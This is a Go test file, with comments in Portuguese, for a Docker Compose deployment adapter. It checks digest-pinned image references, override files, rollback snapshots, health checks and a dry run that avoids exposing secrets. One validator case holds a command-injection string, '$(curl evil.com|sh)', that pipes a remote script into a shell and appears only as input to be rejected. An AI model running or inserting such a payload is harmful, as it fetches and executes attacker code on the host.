package agent

import (
	"context"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func TestValidateImageRef(t *testing.T) {
	cases := []struct {
		ref string
		ok  bool
	}{
		{"ghcr.io/omnira/omnira-api@sha256:" + strings.Repeat("a", 64), true},
		{"127.0.0.1:32881/omnira-test-unit@sha256:" + strings.Repeat("f", 64), true},
		{"nginx:latest", false},                                                // tag móvel, nunca aceita
		{"ghcr.io/omnira/omnira-api", false},                                   // sem digest nenhum
		{"ghcr.io/omnira/omnira-api@sha256:abc", false},                        // digest curto demais
		{"ghcr.io/omnira/omnira-api@sha256:" + strings.Repeat("g", 64), false}, // 'g' não é hex
		{"$(curl evil.com|sh)@sha256:" + strings.Repeat("a", 64), false},       // tentativa de injeção
		{"repo@sha256:" + strings.Repeat("A", 64), false},                      // hex em maiúscula não é aceito (sha256 é sempre minúsculo na forma canônica)
	}
	for _, c := range cases {
		err := validateImageRef(c.ref)
		if c.ok && err != nil {
			t.Errorf("ref=%q deveria ser válida, veio erro: %v", c.ref, err)
		}
		if !c.ok && err == nil {
			t.Errorf("ref=%q deveria ser invalida, foi aceita", c.ref)
		}
	}
}

func TestWriteOverride_RejectsInvalidRef(t *testing.T) {
	a := &ComposeAdapter{OverrideDir: t.TempDir()}
	_, err := a.WriteOverride(map[Unit]string{UnitAPI: "nginx:latest"})
	if err == nil {
		t.Fatal("WriteOverride deveria rejeitar uma referência sem digest")
	}
}

func TestWriteOverride_RejectsUnknownUnit(t *testing.T) {
	a := &ComposeAdapter{OverrideDir: t.TempDir()}
	_, err := a.WriteOverride(map[Unit]string{Unit("database"): "ghcr.io/x@sha256:" + strings.Repeat("a", 64)})
	if err == nil {
		t.Fatal("WriteOverride deveria rejeitar uma unit desconhecida")
	}
}

func TestWriteOverride_WritesValidReferences(t *testing.T) {
	dir := t.TempDir()
	a := &ComposeAdapter{OverrideDir: dir}
	ref := "ghcr.io/omnira/omnira-api@sha256:" + strings.Repeat("a", 64)
	path, err := a.WriteOverride(map[Unit]string{UnitAPI: ref})
	if err != nil {
		t.Fatalf("WriteOverride: %v", err)
	}
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("ler override gerado: %v", err)
	}
	if !strings.Contains(string(data), ref) {
		t.Fatalf("override gerado não contém a referência esperada: %s", data)
	}
	if filepath.Dir(path) != dir {
		t.Fatalf("override deveria ter sido escrito em %s, veio %s", dir, path)
	}
}

// fakeRunner simula o binário docker para os cenários de fault injection que seriam difíceis
// ou arriscados de provocar de verdade no host (registry fora do ar, daemon lento/sem
// resposta) — o caminho feliz completo é sempre testado contra Docker real em
// compose_integration_test.go; isto aqui é só para as bordas de falha de infraestrutura.
type fakeRunner struct {
	calls  []string
	fail   map[string]error  // "docker <primeiro-arg>" -> erro a devolver
	stdout map[string]string // "docker <primeiro-arg>" -> stdout de sucesso a devolver
}

func (f *fakeRunner) run(_ context.Context, name string, args ...string) (string, string, error) {
	key := name
	if len(args) > 0 {
		key = name + " " + args[0]
	}
	f.calls = append(f.calls, strings.Join(append([]string{name}, args...), " "))
	if err, ok := f.fail[key]; ok {
		return "", "simulated failure", err
	}
	return f.stdout[key], "", nil
}

func TestPullByDigest_RegistryUnavailable_PropagatesError(t *testing.T) {
	fr := &fakeRunner{fail: map[string]error{"docker pull": errors.New("dial tcp: no route to host")}}
	a := &ComposeAdapter{r: fr}
	ref := "ghcr.io/omnira/omnira-api@sha256:" + strings.Repeat("a", 64)
	err := a.PullByDigest(context.Background(), ref)
	if err == nil {
		t.Fatal("esperava erro quando o registry está fora do ar")
	}
	if !strings.Contains(err.Error(), "no route to host") {
		t.Fatalf("erro deveria preservar a causa real, veio: %v", err)
	}
}

func TestApply_DockerComposeFails_PropagatesError(t *testing.T) {
	fr := &fakeRunner{fail: map[string]error{"docker compose": errors.New("exit status 1")}}
	a := &ComposeAdapter{r: fr, BaseFiles: []string{"base.yml"}, Project: "test"}
	err := a.Apply(context.Background(), "override.yml", []Unit{UnitAPI})
	if err == nil {
		t.Fatal("esperava erro quando docker compose up falha")
	}
}

func TestApply_RejectsUnknownUnit_NeverCallsDocker(t *testing.T) {
	fr := &fakeRunner{}
	a := &ComposeAdapter{r: fr, BaseFiles: []string{"base.yml"}, Project: "test"}
	err := a.Apply(context.Background(), "override.yml", []Unit{Unit("database")})
	if err == nil {
		t.Fatal("deveria rejeitar unit desconhecida")
	}
	if len(fr.calls) != 0 {
		t.Fatalf("nenhuma chamada docker deveria ter sido feita, veio %v", fr.calls)
	}
}

// TestApply_RejectsEmptyUnitList: achado Codex — `docker compose up -d --no-deps` sem nenhum
// nome de serviço no final afeta TODOS os serviços habilitados, não "nenhum". Uma lista vazia
// tem que ser recusada antes de chegar perto de `docker`.
func TestApply_RejectsEmptyUnitList(t *testing.T) {
	fr := &fakeRunner{}
	a := &ComposeAdapter{r: fr, BaseFiles: []string{"base.yml"}, Project: "test"}
	if err := a.Apply(context.Background(), "override.yml", nil); err == nil {
		t.Fatal("Apply com lista de units vazia/nula deveria recusar")
	}
	if err := a.Apply(context.Background(), "override.yml", []Unit{}); err == nil {
		t.Fatal("Apply com lista de units vazia deveria recusar")
	}
	if len(fr.calls) != 0 {
		t.Fatalf("nenhuma chamada docker deveria ter sido feita, veio %v", fr.calls)
	}
}

// TestCurrentSnapshot_InfrastructureFailure_PropagatesError: achado Codex — se o daemon
// Docker está indisponível, a permissão foi negada, ou o contexto foi cancelado,
// CurrentSnapshot não pode devolver "sucesso com digest vazio" como se simplesmente nunca
// tivesse sido implantado. Isso daria ao chamador um snapshot que PARECE usável para rollback
// mas na verdade nunca leu o estado real.
func TestCurrentSnapshot_InfrastructureFailure_PropagatesError(t *testing.T) {
	fr := &fakeRunner{fail: map[string]error{"docker ps": errors.New("permission denied while trying to connect to the docker API")}}
	a := &ComposeAdapter{r: fr, Project: "test"}
	_, err := a.CurrentSnapshot(context.Background())
	if err == nil {
		t.Fatal("CurrentSnapshot deveria propagar uma falha de infraestrutura, nunca devolver sucesso com digests vazios")
	}
}

// TestCurrentSnapshot_NeverDeployed_EmptyDigestWithoutError: o caso realmente benigno — nenhum
// container com esses labels existe ainda (primeiro deploy) — continua devolvendo sucesso com
// digest vazio, sem erro.
func TestCurrentSnapshot_NeverDeployed_EmptyDigestWithoutError(t *testing.T) {
	fr := &fakeRunner{stdout: map[string]string{"docker ps": ""}}
	a := &ComposeAdapter{r: fr, Project: "test"}
	snap, err := a.CurrentSnapshot(context.Background())
	if err != nil {
		t.Fatalf("primeiro deploy (nenhum container ainda) não deveria ser um erro: %v", err)
	}
	for _, u := range AllUnits {
		if snap.Digests[u] != "" {
			t.Fatalf("%s: esperava digest vazio, veio %q", u, snap.Digests[u])
		}
	}
}

func TestRollback_MissingDigestInSnapshot_RefusesWithoutCallingDocker(t *testing.T) {
	fr := &fakeRunner{}
	a := &ComposeAdapter{r: fr, OverrideDir: t.TempDir()}
	snap := &Snapshot{Digests: map[Unit]string{UnitAPI: ""}}
	err := a.Rollback(context.Background(), snap, []Unit{UnitAPI})
	if err == nil {
		t.Fatal("rollback sem digest anterior deveria recusar")
	}
	if len(fr.calls) != 0 {
		t.Fatalf("nenhuma chamada docker deveria ter sido feita, veio %v", fr.calls)
	}
}

// TestCurrentSnapshot_AdoptedContainerWithoutDigest_TreatedAsUnusable: um container que já
// existia ANTES do agente gerenciá-lo (criado pelo docker-compose.yml real, que usa `build:`
// local) tem `.Config.Image` igual a um nome de imagem local, nunca `repo@sha256:...` (achado
// Codex). Aceitar isso como um snapshot "utilizável" quebraria Rollback depois (WriteOverride
// rejeitaria a referência). O digest capturado deve virar "" (sem rollback de código
// disponível para esta unit), nunca o valor bruto não-digest.
func TestCurrentSnapshot_AdoptedContainerWithoutDigest_TreatedAsUnusable(t *testing.T) {
	fr := &fakeRunner{stdout: map[string]string{
		"docker ps":      "container-id-abc123",
		"docker inspect": "20-omnira-api", // nome de imagem buildada localmente, não um digest
	}}
	a := &ComposeAdapter{r: fr, Project: "test"}
	snap, err := a.CurrentSnapshot(context.Background())
	if err != nil {
		t.Fatalf("CurrentSnapshot não deveria falhar só porque a imagem adotada não tem digest: %v", err)
	}
	for _, u := range AllUnits {
		if snap.Digests[u] != "" {
			t.Fatalf("%s: imagem sem digest deveria virar \"\" (sem rollback utilizável), veio %q", u, snap.Digests[u])
		}
	}
}

// slowRunner nunca retorna por conta própria — só quando o contexto é cancelado. Simula um
// `docker` que travou (daemon sem resposta); um exec.CommandContext real mataria o processo
// nesse momento. Prova que WaitHealthy de fato limita a ESPERA DENTRO DE CADA CHAMADA pelo
// timeout pedido, não só entre tentativas (achado Codex).
type slowRunner struct{}

func (slowRunner) run(ctx context.Context, _ string, _ ...string) (string, string, error) {
	<-ctx.Done()
	return "", "", ctx.Err()
}

func TestWaitHealthy_StalledDockerCommand_BoundedByTimeout(t *testing.T) {
	a := &ComposeAdapter{r: slowRunner{}, Project: "test"}
	start := time.Now()
	err := a.WaitHealthy(context.Background(), UnitAPI, 300*time.Millisecond)
	elapsed := time.Since(start)
	if err == nil {
		t.Fatal("esperava erro quando o comando docker nunca retorna")
	}
	// Generoso (até 3x o timeout) para não ser frágil sob CI lento, mas ainda prova que não
	// ficou pendurado indefinidamente como ficaria usando o ctx do chamador sem prazo.
	if elapsed > 3*300*time.Millisecond {
		t.Fatalf("WaitHealthy deveria ter desistido perto do timeout (300ms), levou %s", elapsed)
	}
}

// TestWriteOverride_DifferentDigestsNeverCollideOrOverwrite: achado Codex — um caminho fixo
// fazia toda chamada de WriteOverride sobrescrever o override de uma chamada anterior ainda em
// uso (ex. preparar a release B mudava silenciosamente o que Apply(pathDeA, ...) aplicaria).
// Conjuntos de digests diferentes devem produzir arquivos DIFERENTES, e ambos continuam
// existindo e com o conteúdo correto depois.
func TestWriteOverride_DifferentDigestsNeverCollideOrOverwrite(t *testing.T) {
	dir := t.TempDir()
	a := &ComposeAdapter{OverrideDir: dir}
	refA := "ghcr.io/omnira/omnira-api@sha256:" + strings.Repeat("a", 64)
	refB := "ghcr.io/omnira/omnira-api@sha256:" + strings.Repeat("b", 64)

	pathA, err := a.WriteOverride(map[Unit]string{UnitAPI: refA})
	if err != nil {
		t.Fatalf("WriteOverride A: %v", err)
	}
	pathB, err := a.WriteOverride(map[Unit]string{UnitAPI: refB})
	if err != nil {
		t.Fatalf("WriteOverride B: %v", err)
	}
	if pathA == pathB {
		t.Fatalf("conjuntos de digests diferentes produziram o MESMO caminho: %s", pathA)
	}
	dataA, err := os.ReadFile(pathA)
	if err != nil {
		t.Fatalf("ler override A depois de escrever B: %v", err)
	}
	if !strings.Contains(string(dataA), refA) || strings.Contains(string(dataA), refB) {
		t.Fatalf("override A foi corrompido/sobrescrito por B: %s", dataA)
	}
}

// TestWriteOverride_SameDigests_SameFile: idempotente — as mesmas referências sempre produzem
// o mesmo arquivo, nunca um novo a cada chamada (evita acumular lixo indefinidamente).
func TestWriteOverride_SameDigests_SameFile(t *testing.T) {
	dir := t.TempDir()
	a := &ComposeAdapter{OverrideDir: dir}
	ref := "ghcr.io/omnira/omnira-api@sha256:" + strings.Repeat("c", 64)
	path1, err := a.WriteOverride(map[Unit]string{UnitAPI: ref})
	if err != nil {
		t.Fatalf("WriteOverride #1: %v", err)
	}
	path2, err := a.WriteOverride(map[Unit]string{UnitAPI: ref})
	if err != nil {
		t.Fatalf("WriteOverride #2: %v", err)
	}
	if path1 != path2 {
		t.Fatalf("as mesmas referências deveriam produzir o mesmo arquivo: %s != %s", path1, path2)
	}
}

// TestWaitHealthy_StoppedContainerWithStaleHealthyStatus_NeverAccepted: achado Codex — Docker
// preserva o último .State.Health.Status mesmo depois que o container parou/saiu. Só checar o
// health status (sem .State.Running) aceitava um container parado como "pronto".
func TestWaitHealthy_StoppedContainerWithStaleHealthyStatus_NeverAccepted(t *testing.T) {
	fr := &fakeRunner{stdout: map[string]string{
		"docker ps":      "container-id-abc123",
		"docker inspect": "false|healthy", // parado, mas com o status de saúde antigo ainda "healthy"
	}}
	a := &ComposeAdapter{r: fr, Project: "test"}
	start := time.Now()
	err := a.WaitHealthy(context.Background(), UnitAPI, 200*time.Millisecond)
	if err == nil {
		t.Fatal("um container PARADO com status de saúde obsoleto 'healthy' nunca deveria ser aceito como pronto")
	}
	if time.Since(start) < 150*time.Millisecond {
		t.Fatal("deveria ter esperado até perto do timeout tentando de novo, não desistido na primeira iteração")
	}
}

// TestDryRun_NeverUsesPlainConfig_AlwaysImagesOnly: achado Codex P1 — `docker compose config`
// (sem `--images`) interpola TODAS as variáveis de ambiente da instalação real, incluindo
// credenciais (OMNIRA_DATABASE_URL, OMNIRA_SESSION_CTX_KEY, segredos do Keycloak). Um dry-run
// de auditoria nunca pode arriscar expor isso — DryRun deve SEMPRE pedir só `--images`.
func TestDryRun_NeverUsesPlainConfig_AlwaysImagesOnly(t *testing.T) {
	fr := &fakeRunner{stdout: map[string]string{"docker compose": "ghcr.io/omnira/omnira-api@sha256:" + strings.Repeat("a", 64) + "\n"}}
	a := &ComposeAdapter{r: fr, BaseFiles: []string{"base.yml"}, Project: "test", OverrideDir: t.TempDir()}
	ref := "ghcr.io/omnira/omnira-api@sha256:" + strings.Repeat("a", 64)
	if _, err := a.DryRun(context.Background(), map[Unit]string{UnitAPI: ref}); err != nil {
		t.Fatalf("DryRun: %v", err)
	}
	if len(fr.calls) != 1 {
		t.Fatalf("esperava 1 chamada docker, veio %v", fr.calls)
	}
	call := fr.calls[0]
	if !strings.Contains(call, "--images") {
		t.Fatalf("DryRun deve SEMPRE incluir --images (nunca config puro, que interpola segredos): %s", call)
	}
	if strings.Contains(call, " config ") && !strings.Contains(call, "config --images") && !strings.Contains(call, "config  --images") {
		// combinação defensiva: garante que --images está colado ao mesmo "config", não a
		// outro subcomando por engano.
		t.Fatalf("chamada de DryRun não está no formato esperado 'config --images': %s", call)
	}
}

// TestResolveContainerID_ExcludesOneoffContainers: achado Codex — um `docker compose run api`
// esquecido (sem --rm) carrega os MESMOS labels de project/service que o deploy real, só
// marcado oneoff=True. A query precisa sempre excluir isso explicitamente.
func TestResolveContainerID_ExcludesOneoffContainers(t *testing.T) {
	fr := &fakeRunner{stdout: map[string]string{"docker ps": "containerid123\n"}}
	a := &ComposeAdapter{r: fr, Project: "test"}
	if _, err := a.resolveContainerID(context.Background(), UnitAPI); err != nil {
		t.Fatalf("resolveContainerID: %v", err)
	}
	if len(fr.calls) != 1 || !strings.Contains(fr.calls[0], "com.docker.compose.oneoff=False") {
		t.Fatalf("a query deveria sempre excluir containers oneoff, veio: %v", fr.calls)
	}
}
